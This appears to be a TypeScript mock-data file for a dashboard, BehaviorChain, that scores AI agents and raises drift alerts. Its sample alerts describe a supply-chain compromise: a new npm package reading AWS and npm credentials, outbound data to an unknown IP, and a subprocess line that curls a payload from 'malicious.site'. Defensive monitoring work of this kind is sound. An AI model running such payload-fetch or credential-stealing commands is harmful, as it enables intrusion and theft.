// BehaviorChain Mock Data

export type Severity = 'GREEN' | 'YELLOW' | 'RED'
export type Risk = 'GREEN' | 'YELLOW' | 'RED'
export type Tier = 'AAA' | 'AA' | 'A' | 'BAA' | 'BA' | 'B' | 'CAA' | 'CA' | 'C'
export type Route = 'prod' | 'prod_throttled' | 'sandbox' | 'sandbox_only'

export interface ChainNode {
  hash: string
  previousHash: string | null
  timestamp: Date
  isGenesis: boolean
  severity: Severity
  description: string
  driftSignals?: {
    field: string
    before: string
    after: string
  }[]
}

export interface DriftAlert {
  id: string
  agentId: number
  severity: 'YELLOW' | 'RED'
  description: string
  timestamp: Date
  worldIdNullifier?: string
  details?: string[]
}

export interface SupplyChainStatus {
  dependencyGraphHash: string
  dependencyHashChanged: boolean
  outboundDestinations: number
  newOutboundInLast30Days: boolean
  credentialAccess: string[]
  subprocessActivity: 'none' | 'detected'
  selfModification: 'none' | 'detected'
}

export interface Agent {
  id: number
  score: number
  tier: Tier
  risk: Risk
  route: Route
  chainLength: number
  lastChange: {
    timeAgo: string
    description: string
  }
  driftFlags: {
    count: number
    highestSeverity: Severity
  }
  chainIntegrity: 'valid' | 'broken'
  cleanLaps: number
  changesPerMonth: number
  worldIdVerified: boolean
  worldIdNullifier?: string
  chain: ChainNode[]
  supplyChain: SupplyChainStatus
}

// Helper to generate hash
const generateHash = (index: number, prefix: string = '0x'): string => {
  const chars = '0123456789abcdef'
  let hash = prefix
  for (let i = 0; i < 64; i++) {
    hash += chars[Math.floor(Math.random() * 16)]
  }
  return hash
}

// Format hash for display
export const formatHash = (hash: string): string => {
  if (hash.length < 12) return hash
  return `${hash.slice(0, 8)}...${hash.slice(-4)}`
}

// Mock agents data
export const agents: Agent[] = [
  // Agent 8192 - Compromised (Axios attack)
  {
    id: 8192,
    score: 23,
    tier: 'C',
    risk: 'RED',
    route: 'sandbox_only',
    chainLength: 9,
    lastChange: {
      timeAgo: '4 min ago',
      description: 'Dependency graph hash changed. New package: plain-crypto-js@4.2.1'
    },
    driftFlags: { count: 5, highestSeverity: 'RED' },
    chainIntegrity: 'valid',
    cleanLaps: 0,
    changesPerMonth: 12,
    worldIdVerified: true,
    worldIdNullifier: '0x7f3a...c891',
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2026-01-01'), isGenesis: true, severity: 'GREEN', description: 'Genesis block - Agent initialized' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2026-01-15'), isGenesis: false, severity: 'GREEN', description: 'Minor configuration update' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2026-02-01'), isGenesis: false, severity: 'GREEN', description: 'Dependency update' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-02-20'), isGenesis: false, severity: 'GREEN', description: 'Performance optimization' },
      { hash: generateHash(4), previousHash: generateHash(3), timestamp: new Date('2026-03-31T08:00:00'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Dependency graph hash changed. New package: plain-crypto-js@4.2.1', driftSignals: [{ field: 'dependencies', before: '142 packages', after: '143 packages (+plain-crypto-js)' }] },
      { hash: generateHash(5), previousHash: generateHash(4), timestamp: new Date('2026-03-31T08:01:29'), isGenesis: false, severity: 'RED', description: 'CRITICAL - New outbound destination: 45.33.xx.xx:8000', driftSignals: [{ field: 'outbound_hosts', before: '3 known hosts', after: '4 hosts (+45.33.xx.xx)' }] },
      { hash: generateHash(6), previousHash: generateHash(5), timestamp: new Date('2026-03-31T08:02:00'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Sensitive credential access: AWS_SECRET_ACCESS_KEY, NPM_TOKEN', driftSignals: [{ field: 'env_access', before: 'PATH, NODE_ENV', after: 'PATH, NODE_ENV, AWS_SECRET_ACCESS_KEY, NPM_TOKEN' }] },
      { hash: generateHash(7), previousHash: generateHash(6), timestamp: new Date('2026-03-31T08:02:30'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Outbound data spike detected', driftSignals: [{ field: 'outbound_bytes', before: '~2KB/min', after: '847KB/min' }] },
      { hash: generateHash(8), previousHash: generateHash(7), timestamp: new Date('2026-03-31T08:03:00'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Self-modification detected', driftSignals: [{ field: 'file_integrity', before: 'All files verified', after: '3 files modified, 1 deleted' }] },
    ],
    supplyChain: {
      dependencyGraphHash: '0x8f3a2b1c...d4e5',
      dependencyHashChanged: true,
      outboundDestinations: 4,
      newOutboundInLast30Days: true,
      credentialAccess: ['AWS_SECRET_ACCESS_KEY', 'NPM_TOKEN'],
      subprocessActivity: 'detected',
      selfModification: 'detected'
    }
  },
  // Agent 3301 - Also compromised
  {
    id: 3301,
    score: 31,
    tier: 'C',
    risk: 'RED',
    route: 'sandbox_only',
    chainLength: 7,
    lastChange: {
      timeAgo: '12 min ago',
      description: 'Sensitive env var access: AWS_SECRET_ACCESS_KEY, NPM_TOKEN'
    },
    driftFlags: { count: 4, highestSeverity: 'RED' },
    chainIntegrity: 'valid',
    cleanLaps: 0,
    changesPerMonth: 8,
    worldIdVerified: false,
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2026-01-10'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2026-02-05'), isGenesis: false, severity: 'GREEN', description: 'Routine update' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2026-02-28'), isGenesis: false, severity: 'GREEN', description: 'Configuration change' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-03-31T07:48:00'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Sensitive env var access detected', driftSignals: [{ field: 'env_access', before: 'NODE_ENV', after: 'AWS_SECRET_ACCESS_KEY, NPM_TOKEN' }] },
      { hash: generateHash(4), previousHash: generateHash(3), timestamp: new Date('2026-03-31T07:48:30'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Subprocess spawned: sh -c "curl -sS https://..."', driftSignals: [{ field: 'subprocesses', before: 'none', after: 'sh, curl' }] },
      { hash: generateHash(5), previousHash: generateHash(4), timestamp: new Date('2026-03-31T07:49:00'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Self-modification detected', driftSignals: [{ field: 'file_hash', before: '0x9a8b7c...', after: '0x1f2e3d...' }] },
      { hash: generateHash(6), previousHash: generateHash(5), timestamp: new Date('2026-03-31T07:49:30'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Unknown network activity', driftSignals: [{ field: 'network', before: 'api.github.com', after: 'api.github.com, sfrclak.com:8000' }] },
    ],
    supplyChain: {
      dependencyGraphHash: '0x2c4e6a8b...f1d3',
      dependencyHashChanged: false,
      outboundDestinations: 3,
      newOutboundInLast30Days: true,
      credentialAccess: ['AWS_SECRET_ACCESS_KEY', 'NPM_TOKEN'],
      subprocessActivity: 'detected',
      selfModification: 'detected'
    }
  },
  // Agent 25459 - Yellow flag (score drop)
  {
    id: 25459,
    score: 92,
    tier: 'AA',
    risk: 'YELLOW',
    route: 'prod_throttled',
    chainLength: 5,
    lastChange: {
      timeAgo: '2h ago',
      description: 'Score dropped 18 points (110→92)'
    },
    driftFlags: { count: 1, highestSeverity: 'YELLOW' },
    chainIntegrity: 'valid',
    cleanLaps: 45,
    changesPerMonth: 0.8,
    worldIdVerified: true,
    worldIdNullifier: '0x2b4d...a7f2',
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2025-10-01'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2025-11-15'), isGenesis: false, severity: 'GREEN', description: 'Initial deployment' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2025-12-20'), isGenesis: false, severity: 'GREEN', description: 'Version upgrade' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-02-10'), isGenesis: false, severity: 'GREEN', description: 'Minor patch' },
      { hash: generateHash(4), previousHash: generateHash(3), timestamp: new Date('2026-03-31T06:00:00'), isGenesis: false, severity: 'YELLOW', description: 'Score dropped 18 points - no supply chain signals', driftSignals: [{ field: 'trust_score', before: '110', after: '92' }] },
    ],
    supplyChain: {
      dependencyGraphHash: '0x5f7a9c1e...b2d4',
      dependencyHashChanged: false,
      outboundDestinations: 2,
      newOutboundInLast30Days: false,
      credentialAccess: [],
      subprocessActivity: 'none',
      selfModification: 'none'
    }
  },
  // Agent 42069 - Perfect agent (champion)
  {
    id: 42069,
    score: 110,
    tier: 'AAA',
    risk: 'GREEN',
    route: 'prod',
    chainLength: 3,
    lastChange: {
      timeAgo: '180 days ago',
      description: 'Initial configuration'
    },
    driftFlags: { count: 0, highestSeverity: 'GREEN' },
    chainIntegrity: 'valid',
    cleanLaps: 892,
    changesPerMonth: 0.1,
    worldIdVerified: true,
    worldIdNullifier: '0x9e1f...d3c8',
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2025-07-01'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2025-08-15'), isGenesis: false, severity: 'GREEN', description: 'Production deployment' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2025-10-05'), isGenesis: false, severity: 'GREEN', description: 'Initial configuration' },
    ],
    supplyChain: {
      dependencyGraphHash: '0x1a2b3c4d...e5f6',
      dependencyHashChanged: false,
      outboundDestinations: 1,
      newOutboundInLast30Days: false,
      credentialAccess: [],
      subprocessActivity: 'none',
      selfModification: 'none'
    }
  },
  // Agent 1337 - Broken chain
  {
    id: 1337,
    score: 0,
    tier: 'C',
    risk: 'RED',
    route: 'sandbox_only',
    chainLength: 4,
    lastChange: {
      timeAgo: '3 days ago',
      description: 'Chain integrity compromised'
    },
    driftFlags: { count: 2, highestSeverity: 'RED' },
    chainIntegrity: 'broken',
    cleanLaps: 0,
    changesPerMonth: 15,
    worldIdVerified: false,
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2026-01-20'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2026-02-10'), isGenesis: false, severity: 'GREEN', description: 'Update' },
      { hash: generateHash(2), previousHash: '0x0000000000000000000000000000000000000000000000000000000000000000', timestamp: new Date('2026-03-15'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Chain link broken - previousHash mismatch' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-03-28'), isGenesis: false, severity: 'RED', description: 'CRITICAL - Unauthorized modification' },
    ],
    supplyChain: {
      dependencyGraphHash: '0x????????...????',
      dependencyHashChanged: true,
      outboundDestinations: 7,
      newOutboundInLast30Days: true,
      credentialAccess: ['DATABASE_URL', 'API_KEY'],
      subprocessActivity: 'detected',
      selfModification: 'detected'
    }
  },
  // Agent 7777 - Stable agent
  {
    id: 7777,
    score: 108,
    tier: 'AAA',
    risk: 'GREEN',
    route: 'prod',
    chainLength: 4,
    lastChange: {
      timeAgo: '92 days ago',
      description: 'Scheduled maintenance update'
    },
    driftFlags: { count: 0, highestSeverity: 'GREEN' },
    chainIntegrity: 'valid',
    cleanLaps: 456,
    changesPerMonth: 0.2,
    worldIdVerified: true,
    worldIdNullifier: '0x4a5b...c6d7',
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2025-06-15'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2025-09-01'), isGenesis: false, severity: 'GREEN', description: 'Initial release' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2025-11-20'), isGenesis: false, severity: 'GREEN', description: 'Security patch' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-01-02'), isGenesis: false, severity: 'GREEN', description: 'Scheduled maintenance update' },
    ],
    supplyChain: {
      dependencyGraphHash: '0x7e8f9a0b...c1d2',
      dependencyHashChanged: false,
      outboundDestinations: 2,
      newOutboundInLast30Days: false,
      credentialAccess: [],
      subprocessActivity: 'none',
      selfModification: 'none'
    }
  },
  // Agent 9999 - World ID delegated, stable
  {
    id: 9999,
    score: 105,
    tier: 'AAA',
    risk: 'GREEN',
    route: 'prod',
    chainLength: 5,
    lastChange: {
      timeAgo: '45 days ago',
      description: 'Routine update'
    },
    driftFlags: { count: 0, highestSeverity: 'GREEN' },
    chainIntegrity: 'valid',
    cleanLaps: 223,
    changesPerMonth: 0.4,
    worldIdVerified: true,
    worldIdNullifier: '0x8c9d...e0f1',
    chain: [
      { hash: generateHash(0), previousHash: null, timestamp: new Date('2025-08-01'), isGenesis: true, severity: 'GREEN', description: 'Genesis block' },
      { hash: generateHash(1), previousHash: generateHash(0), timestamp: new Date('2025-09-15'), isGenesis: false, severity: 'GREEN', description: 'Initial deployment' },
      { hash: generateHash(2), previousHash: generateHash(1), timestamp: new Date('2025-11-01'), isGenesis: false, severity: 'GREEN', description: 'Feature update' },
      { hash: generateHash(3), previousHash: generateHash(2), timestamp: new Date('2026-01-10'), isGenesis: false, severity: 'GREEN', description: 'Performance tuning' },
      { hash: generateHash(4), previousHash: generateHash(3), timestamp: new Date('2026-02-17'), isGenesis: false, severity: 'GREEN', description: 'Routine update' },
    ],
    supplyChain: {
      dependencyGraphHash: '0x3d4e5f6a...b7c8',
      dependencyHashChanged: false,
      outboundDestinations: 3,
      newOutboundInLast30Days: false,
      credentialAccess: [],
      subprocessActivity: 'none',
      selfModification: 'none'
    }
  }
]

// Drift alerts for the feed
export const driftAlerts: DriftAlert[] = [
  {
    id: 'alert-1',
    agentId: 8192,
    severity: 'RED',
    description: 'Dependency graph hash changed. New package: plain-crypto-js@4.2.1 (registered 18h ago). Outbound connection to 45.33.xx.xx (never seen).',
    timestamp: new Date(Date.now() - 4 * 60 * 1000),
    worldIdNullifier: '0x7f3a...c891',
    details: ['Package plain-crypto-js@4.2.1 was registered 18 hours ago', 'No prior history on npm', 'Immediate outbound connection to unknown IP']
  },
  {
    id: 'alert-2',
    agentId: 3301,
    severity: 'RED',
    description: 'Sensitive env var access: AWS_SECRET_ACCESS_KEY, NPM_TOKEN (first time in 200 snapshots). Subprocess spawned: sh -c "curl -sS https://..." Self-modification detected.',
    timestamp: new Date(Date.now() - 12 * 60 * 1000),
    details: ['First credential access in 200 snapshots', 'Subprocess: sh -c "curl -sS https://malicious.site/payload"', 'Modified files: node_modules/.bin/axios']
  },
  {
    id: 'alert-3',
    agentId: 25459,
    severity: 'YELLOW',
    description: 'Score dropped 18 points (110→92). No supply chain signals.',
    timestamp: new Date(Date.now() - 2 * 60 * 60 * 1000),
    details: ['Score decrease from 110 to 92', 'All supply chain indicators stable', 'Recommend manual review']
  },
  {
    id: 'alert-4',
    agentId: 8192,
    severity: 'RED',
    description: 'CRITICAL - Outbound data spike: 847KB transmitted to 45.33.xx.xx',
    timestamp: new Date(Date.now() - 5 * 60 * 1000),
    worldIdNullifier: '0x7f3a...c891'
  },
  {
    id: 'alert-5',
    agentId: 1337,
    severity: 'RED',
    description: 'Chain integrity compromised - previousHash mismatch detected',
    timestamp: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000),
    details: ['Block 3 claims previousHash that does not match Block 2', 'Chain verification failed', 'Agent quarantined']
  }
]

// Aggregate stats
export const aggregateStats = {
  totalAgents: 2847,
  totalBehavioralChanges: 18934,
  driftDetectionRate: 99.7,
  avgCleanLapsBetweenChanges: 156,
  chainIntegrityRate: 99.2,
  industryAvgDetectionDays: 267,
  behaviorChainDetectionSeconds: 5
}

// Drift events over time (for charts)
export const driftEventsOverTime = {
  '7d': [
    { date: '03/28', events: 12 },
    { date: '03/29', events: 8 },
    { date: '03/30', events: 15 },
    { date: '03/31', events: 47 },
    { date: '04/01', events: 23 },
    { date: '04/02', events: 11 },
    { date: '04/03', events: 9 }
  ],
  '30d': [
    { date: 'Week 1', events: 45 },
    { date: 'Week 2', events: 38 },
    { date: 'Week 3', events: 52 },
    { date: 'Week 4', events: 89 }
  ],
  '90d': [
    { date: 'Jan', events: 134 },
    { date: 'Feb', events: 112 },
    { date: 'Mar', events: 189 }
  ]
}

// Severity distribution
export const severityDistribution = [
  { name: 'GREEN', value: 2341, color: '#22c55e' },
  { name: 'YELLOW', value: 389, color: '#f59e0b' },
  { name: 'RED', value: 117, color: '#ef4444' }
]

// Helper to get agent by ID
export const getAgentById = (id: number): Agent | undefined => {
  return agents.find(a => a.id === id)
}

// Get tier color
export const getTierColor = (tier: Tier): string => {
  if (tier === 'AAA' || tier === 'AA' || tier === 'A') return '#22c55e'
  if (tier === 'BAA' || tier === 'BA' || tier === 'B') return '#f59e0b'
  return '#ef4444'
}

// Get risk color
export const getRiskColor = (risk: Risk): string => {
  if (risk === 'GREEN') return '#22c55e'
  if (risk === 'YELLOW') return '#f59e0b'
  return '#ef4444'
}

// Get severity color
export const getSeverityColor = (severity: Severity): string => {
  if (severity === 'GREEN') return '#22c55e'
  if (severity === 'YELLOW') return '#f59e0b'
  return '#ef4444'
}

// Format time ago
export const formatTimeAgo = (date: Date): string => {
  const now = new Date()
  const diff = now.getTime() - date.getTime()
  const minutes = Math.floor(diff / 60000)
  const hours = Math.floor(diff / 3600000)
  const days = Math.floor(diff / 86400000)
  
  if (minutes < 60) return `${minutes} min ago`
  if (hours < 24) return `${hours}h ago`
  return `${days} days ago`
}
